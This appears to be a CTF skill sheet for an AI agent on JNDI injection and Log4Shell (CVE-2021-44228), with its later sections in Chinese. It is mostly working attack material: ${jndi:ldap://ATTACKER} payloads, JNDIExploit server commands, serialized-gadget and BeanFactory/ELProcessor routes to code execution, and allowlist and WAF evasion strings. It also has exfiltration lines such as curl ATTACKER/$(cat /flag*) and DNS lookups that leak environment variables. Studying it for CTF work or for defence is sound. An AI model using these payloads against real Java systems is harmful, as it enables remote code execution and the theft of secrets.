---
name: jndi-injection
description: JNDI injection and Log4Shell (CVE-2021-44228). Use when a Java app does JNDI lookups with attacker-controlled names (Log4j2 log fields, Spring, any InitialContext.lookup path). Covers the ${jndi:...} payload, RMI/LDAP vectors, JDK version constraints, and the post-8u191 serialized-gadget bypass. The goal is usually RCE on the Java app to read the flag.
---

# JNDI Injection / Log4Shell

## 1. Trigger

Any input logged by Log4j2 or passed to `InitialContext.lookup()`:

```
${jndi:ldap://ATTACKER:1389/a}
${jndi:rmi://ATTACKER:1099/a}
${jndi:dns://ATTACKER/a}       # detection only — confirms injection via DNS hit
```

Injection points: User-Agent, X-Forwarded-For, username/login fields, search terms, headers — anything that lands in a log line or a lookup.

## 2. Vectors

- **LDAP** (preferred): attacker runs an LDAP server returning `javaCodeBase`/`javaFactory` → JVM downloads and runs the class.
- **RMI**: attacker returns a `Reference` to `http://ATTACKER/Exploit.class`.
- **DNS**: confirm-only (no RCE) — fire `${jndi:dns://x.ATTACKER}` and watch for the lookup.

```bash
# attacker side (JNDIExploit / rogue-jndi style):
java -jar JNDIExploit-1.4.jar -i ATTACKER_IP   # serves ldap:// + rmi:// + http:// payloads
# then send: ${jndi:ldap://ATTACKER:1389/Basic/Command/Base64/<b64 of cat /flag*>}
```

## 3. JDK constraints & bypass

| JDK | RMI | LDAP | Bypass |
|---|---|---|---|
| < 8u121 | yes | yes | direct class load |
| 8u121–8u190 | no | yes | use LDAP |
| ≥ 8u191 | no | no | **LDAP returns a serialized gadget object** (`javaSerializedData`) — deserialized locally, needs a gadget chain (CommonsCollections/CommonsBeanutils) on the classpath |

Modern targets are usually ≥ 8u191, so prefer the **LDAP serialized-gadget** route or the **BeanFactory + EL** route over naive class loading.

## 4. Tooling

`JNDIExploit` / `rogue-jndi` / `marshalsec` — single jars that spin up LDAP+RMI+HTTP and encode commands. Run them on a host reachable from the target (VPN/tunnel); then the payload is just a log line.

## 5. Read the flag

After RCE: `cat /flag*`, `find / -name 'flag*' -exec cat {} \; 2>/dev/null`, `env | grep -i flag`. If output is not returned (blind), use `${jndi:ldap://ATTACKER/${env:FLAG}}` or command-exfil: `curl ATTACKER/$(cat /flag*)`.

## 6. Discipline

- Confirm with `${jndi:dns://...}` (cheap, no RCE) before the full LDAP payload.
- Check the JDK version (`java -version` or version in error banners) to pick RMI vs LDAP vs serialized-gadget.
- Log4Shell only fires on Log4j2 ≤ 2.14.1 — check `log4j` in the app's jars/headers first; a modern Log4j (2.17+) won't trigger.

## 5. 协议绕过(当 ldap/rmi/dns 被 allowlist 禁止时)

这是正式赛 bctf-22 的卡点: allowlist 只禁了 `ldap`/`rmi`/`dns` scheme,但可以用变体:

| 被禁协议 | 绕过 |
|---|---|
| `ldap` | `ldaps`(SSL 版,很多 allowlist 漏掉) |
| `ldap` | `LDAP`(大小写,某些解析器敏感) |
| `rmi` | `iiop`(CORBA-IIOP,少见但有效) |
| 全部外连被禁 | 用本机 classpath gadget(不需要外连,见下) |

```
# ldaps 绕过示例:
${jndi:ldaps://attacker:1636/cn=Exploit}
```

## 6. 无外网(容器内)利用策略

CTF 容器通常**不能外连**。此时传统 JNDI→远程 class 不可行,需要:

### 方案 A: 本地 classpath 反序列化(不需要外连)

如果目标 classpath 有 gadget(CommonsCollections/Groovy/Spring等):
```
# 让 JNDI lookup 指向本地 RMI registry:
${jndi:rmi://127.0.0.1:1099/x}
# 或利用 InitialContext 的 serialized 属性直接反序列化
```

### 方案 B: BeanFactory + 表达式(Tomcat 环境)

Tomcat classpath 自带 `org.apache.naming.factory.BeanFactory`:
```
# LDAP 返回:
javaClassName: javax.el.ELProcessor
javaFactory: org.apache.naming.factory.BeanFactory
forceString: x=eval
x: Runtime.getRuntime().exec("cat /flag")
```

### 方案 C: 利用目标自身服务做 LDAP/RMI

如果目标本身跑了 LDAP 服务(如 bctf-22 "目录服务集成"):
```
# JNDI lookup 指向目标自己的 LDAP,注入搜索:
${jndi:ldap://127.0.0.1:389/cn=admin}
# 或利用 LDAP 属性读 flag
```

### 方案 D: DNS 带外 + 文件读

```
# DNS 带外确认:
${jndi:dns://${env:FLAG}.attacker.com}
# 环境变量带出:
${jndi:ldap://${sys:user.dir}.attacker.com}
# (需要目标能 DNS 解析)
```

## 7. Log4j 绕过 WAF/过滤

```
# 原始: ${jndi:ldap://x}
# 绕过方式:
${${lower:j}ndi:ldap://x}
${${upper:j}ndi:ldap://x}
${${::-j}${::-n}${::-d}${::-i}:ldap://x}
${${env:NaN:-j}ndi${env:NaN:-:}ldap://x}
${j${::-n}di:ldap://x}
```

## 铁律

- **先确认 JNDI 注入存在**(DNS 带外最安全)
- **查 JDK 版本**(决定是远程 class 还是序列化 gadget)
- **容器无外网时用本地 classpath gadget 或 BeanFactory**
- **allowlist 禁 ldap 就试 ldaps/大小写/iiop**
